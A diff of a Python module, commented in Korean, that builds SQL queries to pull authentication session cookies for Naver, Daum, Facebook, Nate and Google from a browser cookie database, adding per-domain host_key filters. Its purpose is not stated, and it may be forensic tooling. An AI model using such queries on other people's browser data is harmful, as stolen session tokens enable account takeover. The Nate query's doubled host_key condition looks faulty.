@@ -19,33 +19,61 @@ def exc_path_database():
 # =============================================================
 
 
-def search_db(app_name):
+def search_db(app_name, host_key):
     # 각 앱의 인증에 유효한 데이터만을 추출하는데 필요한 변수 모음
     # 네이버
     if app_name == 'nhn':
-        t = ('nid_inf', 'NID_AUT', 'NID_JKL', 'NID_SES',)
+        t = (host_key, 'nid_inf', 'NID_AUT', 'NID_JKL', 'NID_SES',)
         sql = 'SELECT name, value ' \
               'FROM cookies ' \
-              'WHERE name=? or name=? or name=? or name=?'
+              'WHERE host_key=? ' \
+              'AND (name=? or name=? or name=? or name=?)'
         return {'t': t, 'sql': sql}
     # 다음
     elif app_name == 'daum':
-        t = ('TS', 'HTS', 'HM_CU', 'PROF', 'ALID', 'LSID',)
+        t = (host_key, 'TS', 'HTS', 'HM_CU', 'PROF', 'ALID', 'LSID',)
         sql = 'SELECT name, value ' \
               'FROM cookies ' \
-              'WHERE name=? or name=? or name=? or name=? or name=? or name=?'
+              'WHERE host_key=? ' \
+              'AND (name=? or name=? or name=? or name=? or name=? or name=?)'
         return {'t': t, 'sql': sql}
     # 페이스북
     elif app_name == 'facebook':
-        t = ('c_user', 'xs', 'fr',)
+        t = (host_key, 'c_user', 'xs', 'fr',)
         sql = 'SELECT name, value ' \
               'FROM cookies ' \
-              'WHERE name=? or name=? or name=?'
+              'WHERE host_key=? ' \
+              'AND (name=? or name=? or name=?)'
         return {'t': t, 'sql': sql}
+    # 네이트
     elif app_name == 'nate':
-        t = ('.nate.com', 'SFN',)
+        t = (host_key, '.nate.com', 'SFN',)
         sql = 'SELECT name, value ' \
               'FROM cookies ' \
-              'WHERE host_key=? and name=?'
+              'WHERE host_key=? ' \
+              'AND host_key=? and name=?'
+        return {'t': t, 'sql': sql}
+    # 구글
+    elif app_name == 'google':
+        t = (host_key,)
+        sql = 'SELECT name, value ' \
+              'FROM cookies ' \
+              'WHERE host_key=?'
         return {'t': t, 'sql': sql}
     return
+
+
+# =============================================================
+
+def host_key_db(app_name):
+    if app_name == 'nhn':
+        return ['.naver.com']
+    elif app_name == 'daum':
+        return ['.daum.net']
+    elif app_name == 'facebook':
+        return []
+    elif app_name == 'nate':
+        return []
+    elif app_name == 'google':
+        return ['.google.co.kr', '.google.com', 'accounts.google.com']
+    return []
